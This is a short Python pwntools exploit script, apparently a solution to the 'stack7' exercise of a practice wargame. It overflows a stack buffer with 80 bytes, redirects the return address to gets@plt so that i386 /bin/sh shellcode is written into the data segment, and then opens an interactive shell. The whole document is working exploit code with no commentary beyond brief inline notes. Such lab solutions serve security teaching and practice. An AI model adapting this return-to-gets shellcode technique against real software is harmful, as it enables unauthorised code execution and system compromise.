from pwn import *
from subprocess import *

shellcode = asm(shellcraft.i386.linux.sh())

print shellcode
gets_plt = 0x080484EA
DATA_SEGMENT = 0x08049764
BINARY = "./bin/stack7"
r = process(BINARY)
print "process:",str(r.proc.pid)
payload = "A"*80
payload += p32(gets_plt) # ret
payload += p32(DATA_SEGMENT) # return after gets
payload += p32(DATA_SEGMENT) # argv of gets
print "payload:",payload,shellcode
r.sendline(payload)
r.sendline(shellcode) # gets(DATA_SEGMENT)
r.sendline('id') # gets(DATA_SEGMENT)
r.interactive()
